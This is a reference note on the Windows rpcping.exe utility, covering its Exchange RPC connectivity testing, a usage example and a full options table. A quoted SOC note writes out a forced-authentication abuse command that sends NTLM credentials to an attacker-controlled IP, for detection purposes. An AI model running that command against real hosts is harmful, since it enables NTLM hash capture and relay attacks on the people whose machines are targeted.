---
created: 2026-11-21
fullpath: 'C:\Windows\System32\rpcping.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - rpc
  - networking
aliases:
  - rpcping.exe
  - rpcping
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/rpcping
---

**fullpath**:C:\Windows\System32\rpcping.exe

# description

rpcping is a Windows command that confirms RPC connectivity between a computer running Microsoft Exchange Server and supported Exchange client workstations. It is documented in the Windows Server Windows Commands reference and can test plain RPC endpoints, interfaces via the endpoint mapper, and RPC over HTTP proxies.

## simple description

> ### 2026-11-21 Claude said
> rpcping.exe is a built-in tool that "pings" a server over Remote Procedure Call (RPC) instead of ICMP. Admins use it to check whether an RPC endpoint, the endpoint mapper, or an RPC-over-HTTP proxy (classic Outlook Anywhere) is reachable and whether authentication works. It can use NTLM, Kerberos or Negotiate and can send explicit credentials. It lives in System32 on all modern Windows versions.
>
> **SOC NOTE**: Abused as a LOLBin for credential theft: `rpcping -s <attacker_ip> -e 1234 -a privacy -u NTLM` (or with /t ncacn_np) makes the host send an NTLM authentication to an attacker-controlled server, enabling NTLM relay/hash capture (MITRE ATT&CK T1187 Forced Authentication, T1003). Also usable for RPC reconnaissance (T1046). Alert on rpcping runs from non-admin contexts or to external/unusual IPs, and on outbound SMB/RPC following it.
>

# purpose

Checks whether Exchange Server (or any RPC server) services respond to RPC requests from client workstations over the network. It supports choosing the protocol sequence (ncacn_ip_tcp, ncacn_np, ncacn_http), endpoint or interface UUID, number of iterations for latency measurement, security package and authentication level, and RPC/HTTP proxy authentication options.

# typical use cases

| usage | description |
| --- | --- |
| `rpcping /t ncacn_http /s exchange_server /o RpcProxy=front_end_proxy /P username,domain,* /H Basic /u NTLM /a connect /F 3` | Checks whether the Exchange server reached through RPC/HTTP is accessible. |
| `rpcping /?` | Displays help at the command prompt. |

# options

| option | description |
| --- | --- |
| `/t <protseq>` | Protocol sequence: ncacn_ip_tcp, ncacn_np or ncacn_http; default ncacn_ip_tcp. |
| `/s <server_addr>` | Server address; if omitted the local machine is pinged. |
| `/e <endpoint>` | Endpoint to ping; default is the endpoint mapper. Mutually exclusive with /f. |
| `/o <binding_options>` | Binding options for the RPC ping. |
| `/f <interface UUID>[,Majorver]` | Interface to ping by UUID (version 1 if not given); the endpoint mapper is queried for its endpoint. Mutually exclusive with /e. |
| `/O <object UUID>` | Object UUID if the interface registered one. |
| `/i <#_iterations>` | Number of calls to make (default 1); useful for measuring latency. |
| `/u <security_package_id>` | Security package: Negotiate (9), NTLM (10), SChannel (14), Kerberos (16), Kernel (20). Requires an authentication level other than none. |
| `/a <authn_level>` | Authentication level: connect, call, pkt, integrity, privacy. Requires /u. |
| `/N <server_princ_name>` | Server principal name; only with /u and /a. |
| `/I <auth_identity>` | Alternative identity as user,domain,password (`*` prompts for password); only with /u and /a. |
| `/C <capabilities>` | Hexadecimal bitmask of capability flags; only with /u and /a. |
| `/T <identity_tracking>` | static or dynamic (default dynamic); only with /u and /a. |
| `/M <impersonation_type>` | anonymous, identify, impersonate (default) or delegate; only with /u and /a. |
| `/S <server_sid>` | Expected SID of the server; only with /u and /a. |
| `/P <proxy_auth_identity>` | Identity for the RPC/HTTP proxy, same format as /I; requires /u, /a and /H. |
| `/F <RPCHTTP_flags>` | RPC/HTTP front-end flags: Use SSL (1) and Use first auth scheme (2); requires /u and /a. |
| `/H <RPC/HTTP_authn_schemes>` | RPC/HTTP front-end auth schemes: Basic (1), NTLM (2), Certificate (65536); requires /u and /a. |
| `/B <server_certificate_subject>` | Expected server certificate subject; requires SSL, /u and /a. |
| `/b` | Retrieves and prints the server certificate subject; only with /E and SSL, and requires /u and /a. |
| `/R` | HTTP proxy: none, default (IE settings) or explicit proxy; valid only with /E. |
| `/E` | Restricts the ping to the RPC/HTTP proxy only; requires /u and /a. |
| `/q` | Quiet mode; no prompts except passwords, assumes Y to all queries. |
| `/c` | Use smart card certificate; prompts to choose a smart card. |
| `/A` | Identity to authenticate to the HTTP proxy, same format as /I; requires /U, /u and /a. |
| `/U` | HTTP proxy auth schemes: Basic (1), NTLM (2); requires /u and /a. |
| `/r` | Report interval in seconds (default 15) for periodic statistics with multiple iterations. |
| `/v` | Verbosity level; default 1, 2 and 3 give more output. |
| `/d` | Launches the RPC network diagnostic UI. |
| `/p` | Prompts for credentials if authentication fails. |
| `/?` | Displays help at the command prompt. |
